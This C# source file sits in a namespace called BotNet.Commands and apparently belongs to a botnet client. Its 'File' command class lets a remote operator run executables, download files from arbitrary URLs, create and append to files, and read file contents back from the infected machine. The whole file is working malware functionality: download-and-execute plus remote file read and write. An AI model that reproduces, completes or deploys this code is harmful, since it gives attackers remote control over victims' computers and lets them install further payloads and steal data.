using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace BotNet.Commands
{
    public class File : Command
    {
        public File (string name) : base(name)
        {
        }

        public override string execute(string[] args)
        {
            if (args.Length >= 1)
            {
                switch (args.First())
                {
                    case "run":
                        if (args.Length != 2) return "Expected 2 arguments for file run.";
                        return this.runFile(args[1]);
                    case "download":
                        if (args.Length != 3) return "Expected 3 arguments for file run.";
                        return this.runDownload(args[1], args[2]);
                    case "create":
                        if (args.Length != 2) return "Expected 2 arguments for file run.";
                        return this.runCreate(args[1]);
                    case "write":
                        if (args.Length != 3) return "Expected 3 arguments for file run.";
                        return this.runWrite(args[1], args[2]);
                    case "view":
                        if (args.Length != 2) return "Expected 2 arguments for file run.";
                        return this.runView(args[1]);
                    default:
                        return "Unexpected argument " + args[0];
                }
            }
            return "No operation selected -> [run/download/create/write/view]";
        }

        public string runFile(string fn)
        {
            if (System.IO.File.Exists(fn))
            {
                return "Started process with id " + Process.Start(fn).Id;
            }
            else
            {
                return "File not found";
            }
        }

        public string runDownload(string url, string fn)
        {
            using (WebClient wc = new WebClient()) {
                wc.DownloadFile(url, fn);

                return "Downloaded file " + fn;
            }

        }
        public string runCreate(string fn)
        {
            System.IO.File.Create(fn).Close();

            return "Created file " + fn;
        }
        public string runWrite(string fn, string data)
        {
            System.IO.File.AppendAllText(fn, data);
            return "Appended text to file " + fn;

        }
        public string runView(string fn)
        {
            return System.IO.File.ReadAllText(fn);
        }


    }
}
